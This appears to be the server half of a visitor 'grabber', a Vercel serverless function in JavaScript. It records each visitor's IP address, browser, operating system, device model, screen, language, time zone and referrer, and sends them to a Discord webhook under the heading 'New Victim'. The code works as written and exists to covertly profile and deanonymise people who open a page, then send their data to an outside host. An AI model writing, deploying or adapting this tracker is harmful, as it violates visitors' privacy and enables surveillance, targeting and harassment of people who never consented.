import { UAParser } from 'ua-parser-js';

// Vercel Serverless Function to log visitor details to Discord with high accuracy
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const {
      name,
      screen,
      viewport,
      timeZone,
      language,
      platform,
      theme,
      touch,
      url,
      referrer,
      localTime
    } = req.body || {};

    const visitorName = name ? name.trim() : "Unknown";

    // Extract IP address from request headers
    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'Unknown';
    // Clean up forwarded IP list if multiple exist
    const cleanIp = ip && ip !== 'Unknown' ? ip.split(',')[0].trim() : 'Unknown';

    // Parse user agent using ua-parser-js
    const ua = req.headers['user-agent'] || '';
    const parser = new UAParser(ua);
    const result = parser.getResult();

    // Browser details
    const browserName = result.browser.name || "";
    const browserVer = result.browser.version || "";
    const browserString = browserName 
      ? (browserVer ? `${browserName} ${browserVer}` : browserName)
      : "Unknown";

    // OS details
    const osName = result.os.name || "";
    const osVer = result.os.version || "";
    const osString = osName
      ? (osVer ? `${osName} ${osVer}` : osName)
      : "Unknown";

    // Device Category (Desktop / Mobile / Tablet)
    let deviceType = "Desktop";
    if (result.device.type === 'mobile') {
      deviceType = "Mobile";
    } else if (result.device.type === 'tablet') {
      deviceType = "Tablet";
    } else if (result.device.type) {
      deviceType = result.device.type.charAt(0).toUpperCase() + result.device.type.slice(1);
    }

    const deviceModel = result.device.model || "Unknown";
    const deviceVendor = result.device.vendor || "Unknown";

    // Format fields with fallback to "Unknown"
    const finalScreen = screen || "Unknown";
    const finalViewport = viewport || "Unknown";
    const finalLanguage = language || "Unknown";
    const finalTimeZone = timeZone || "Unknown";
    const finalTheme = theme || "Unknown";
    const finalTouch = touch || "Unknown";
    const finalUrl = url || "Unknown";
    const finalReferrer = referrer || "Unknown";
    const finalLocalTime = localTime || "Unknown";

    // Retrieve Discord Webhook URL from environment variables
    const discordUrl = process.env.DISCORD_WEBHOOK_URL;
    if (discordUrl) {
      const message = {
        content: `🎭 **New Victim**\n\n` +
                 `👤 **Name:**\n${visitorName}\n\n` +
                 `🌍 **IP:**\n${cleanIp}\n\n` +
                 `💻 **Browser:**\n${browserString}\n\n` +
                 `🖥 **Operating System:**\n${osString}\n\n` +
                 `📱 **Device:**\n${deviceType}\n\n` +
                 `🏷 **Device Model:**\n${deviceModel}\n\n` +
                 `🏢 **Vendor:**\n${deviceVendor}\n\n` +
                 `🖥 **Screen:**\n${finalScreen}\n\n` +
                 `📐 **Viewport:**\n${finalViewport}\n\n` +
                 `🌐 **Language:**\n${finalLanguage}\n\n` +
                 `🕒 **Time Zone:**\n${finalTimeZone}\n\n` +
                 `🎨 **Theme:**\n${finalTheme}\n\n` +
                 `👆 **Touch:**\n${finalTouch}\n\n` +
                 `🔗 **URL:**\n${finalUrl}\n\n` +
                 `↩ **Referrer:**\n${finalReferrer}\n\n` +
                 `🕒 **Local Time:**\n${finalLocalTime}`
      };

      await fetch(discordUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      });
    } else {
      console.warn('DISCORD_WEBHOOK_URL is not set in the environment.');
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Error logging to Discord:', err);
    return res.status(500).json({ error: 'Internal Server Error' });
  }
}
